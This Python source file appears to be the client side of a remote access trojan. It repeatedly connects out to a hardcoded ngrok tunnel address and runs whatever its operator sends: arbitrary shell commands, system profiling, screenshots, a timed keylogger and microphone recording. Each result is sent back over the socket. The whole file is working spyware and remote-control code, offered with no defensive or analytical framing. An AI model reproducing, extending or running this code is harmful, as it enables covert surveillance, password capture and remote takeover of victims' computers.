import sys, os, socket, time, base64, tabulate, platform, io, psutil, subprocess, threading, pyscreenshot
from datetime import datetime
try:
    from pynput.keyboard import Listener
    import sounddevice as sd
    from scipy.io.wavfile import write
    HAVE_LIBS = True
except:
    HAVE_LIBS = False

CONSTIP = "0.tcp.in.ngrok.io"
CONSTPT = 18555

class AUDIO:
    def record(self, seconds):
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        obj = io.BytesIO()
        write(obj, fs, rec)
        return obj.getvalue()

class SYSINFO:
    def __init__(self):
        self.sysinfo = self.get_sys_info()
        self.boot_time = self.get_boot_time()
        self.cpu_info = self.get_cpu_info()
        self.mem_usage = self.get_mem_usage()
        self.disk_info = self.get_disk_info()
        self.net_info  = self.get_net_info()
    def get_size(self, b, s="B"):
        f = 1024
        for u in ["", "K", "M", "G", "T", "P"]:
            if b < f: return f"{b:.2f}{u}{s}"
            b /= f
    def get_sys_info(self):
        un = platform.uname()
        v = [("System", un.system), ("Node", un.node), ("Release", un.release), ("Version", un.version), ("Machine", un.machine), ("Processor", un.processor)]
        return tabulate.tabulate(v, headers=("Platform Tag", "Information"))
    def get_boot_time(self):
        bt = datetime.fromtimestamp(psutil.boot_time())
        return tabulate.tabulate([("Boot Time", f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")], headers=("Boot Tags", "Information"))
    def get_cpu_info(self):
        cp = psutil.cpu_freq()
        v = [("Physical Cores", psutil.cpu_count(logical=False)), ("Total Cores", psutil.cpu_count(logical=True)), ("Max Freq", f"{cp.max:.2f}Mhz"), ("CPU Usage", f"{psutil.cpu_percent()}%")]
        return tabulate.tabulate(v, headers=("CPU Tag", "Value"))
    def get_mem_usage(self):
        sm, sw = psutil.virtual_memory(), psutil.swap_memory()
        v = [("Total Mem", self.get_size(sm.total)), ("Available", self.get_size(sm.available)), ("Used", self.get_size(sm.used)), ("Total Swap", self.get_size(sw.total))]
        return tabulate.tabulate(v, headers=("Memory Tag", "Value"))
    def get_disk_info(self):
        v = []
        for p in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(p.mountpoint)
                v.append([p.device, p.mountpoint, p.fstype, self.get_size(u.total), self.get_size(u.used), f"{u.percent}%"])
            except: continue
        return tabulate.tabulate(v, headers=("Device", "Mount", "FS", "Total", "Used", "PCNT"))
    def get_net_info(self):
        v = []
        for n, ads in psutil.net_if_addrs().items():
            for a in ads:
                if str(a.family) == 'AddressFamily.AF_INET':
                    v.append([n, a.address, a.netmask, a.broadcast])
        return tabulate.tabulate(v, headers=('Interface', 'IP', 'Netmask', 'Broadcast'))
    def get_data(self):
        return f"\n{self.sysinfo}\n\n{self.boot_time}\n\n{self.cpu_info}\n\n{self.mem_usage}\n\n{self.disk_info}\n\n{self.net_info}\n"

class SCREENSHOT:
    def get_data(self):
        obj = io.BytesIO()
        im = pyscreenshot.grab()
        im.save(obj, format="PNG")
        return obj.getvalue()

class CLIENT:
    SOCK = None
    KEY  = ")J@NcRfU"
    def __init__(self, _ip, _pt):
        self.ipaddress, self.port = _ip, _pt
    def send_data(self, tosend, encode=True):
        if encode: self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else: self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
    def run_keylogger(self, duration):
        strokes = ""
        def on_press(key):
            nonlocal strokes
            k = str(key).replace("'", "")
            strokes += k if len(k) == 1 else f"[{k}]"
        stop_event = threading.Event()
        def timer():
            time.sleep(duration)
            stop_event.set()
        threading.Thread(target=timer).start()
        with Listener(on_press=on_press) as l:
            while not stop_event.is_set():
                if not l.running: break
                time.sleep(0.1)
            l.stop()
        return strokes
    def execute(self, command):
        data = command.decode('utf-8').split(":")
        if data[0] == "shell":
            t = data[1].strip()
            if t.startswith("cd "):
                try: os.chdir(t[3:]); self.send_data("")
                except: self.send_data("Error")
            else:
                try:
                    c = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    o, e = c.communicate()
                    self.send_data(o + e)
                except: self.send_data("Error")
        elif data[0] == "sysinfo": self.send_data(SYSINFO().get_data())
        elif data[0] == "screenshot": self.send_data(SCREENSHOT().get_data(), False)
        elif data[0] == "keylog":
            try: self.send_data(self.run_keylogger(int(data[1])))
            except: self.send_data("Keylog Error")
        elif data[0] == "record":
            try: self.send_data(AUDIO().record(int(data[1])), False)
            except: self.send_data("Audio Error")
    def engage(self):
        while True:
            try:
                self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.SOCK.connect((self.ipaddress, self.port))
                while True:
                    f = b""
                    while True:
                        c = self.SOCK.recv(4096)
                        if not c: break
                        f += c
                        if self.KEY.encode() in c:
                            cmd = base64.decodebytes(f.rstrip(self.KEY.encode()))
                            threading.Thread(target=self.execute, args=(cmd,), daemon=True).start()
                            f = b""
            except: time.sleep(10)

if __name__ == "__main__":
    CLIENT(CONSTIP, CONSTPT).engage()
